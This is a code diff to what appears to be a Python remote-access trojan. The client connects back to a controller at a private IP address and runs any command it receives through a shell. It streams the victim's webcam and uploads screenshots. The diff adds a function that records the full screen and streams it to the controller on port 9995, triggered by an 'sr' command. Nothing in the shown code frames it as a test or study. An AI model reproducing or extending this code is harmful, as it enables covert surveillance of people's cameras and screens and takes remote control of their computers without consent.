@@ -9,10 +9,13 @@ import cv2
 import pickle
 import struct
 import pyautogui
+import pygame
+from PIL import ImageGrab
+import numpy as np
 
 
 sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sc.connect(('192.168.1.16', 5555))
+sc.connect(('192.168.1.12', 5555))
 
 def accepted():
 	data = ''
@@ -50,7 +53,7 @@ def log_thread():
 
 def byte_stream():
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	sock.connect(('192.168.1.16', 9999))
+	sock.connect(('192.168.1.12', 9999))
 	vid = cv2.VideoCapture(0)
 	while (vid.isOpened()):
 		img, frame = vid.read()
@@ -60,6 +63,27 @@ def byte_stream():
 
 def send_byte_stream():
 	t = threading.Thread(target=byte_stream)
+	t.start()
+
+def bstream_recorder(): #screen recording function
+	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	sock.connect(('192.168.1.12', 9995))
+
+	screen = pygame.display.set_mode((0,0), pygame.FULLSCREEN)
+	screen = screen.get_size()
+	WIDTH = screen[0]/2
+	HEIGHT = screen[1]
+
+	while True:
+		img = ImageGrab.grab(bbox=(0,0,WIDTH,HEIGHT))
+		capt = np.array(img)
+		capt = cv2.cvtColor(capt, cv2.COLOR_BGR2RGB)
+		b = pickle.dumps(capt)
+		message = struct.pack("i", len(b))+b
+		sock.sendall(message)
+
+def sbyte_recorder():
+	t = threading.Thread(target=bstream_recorder)
 	t.start()
 
 def do_command():
@@ -87,6 +111,8 @@ def do_command():
 			ss = pyautogui.screenshot()
 			ss.save('ss.png')
 			ulf('ss.png')
+		elif command == 'sr':
+			sbyte_recorder()
 		else:
 			execute = subprocess.Popen(
 									command,
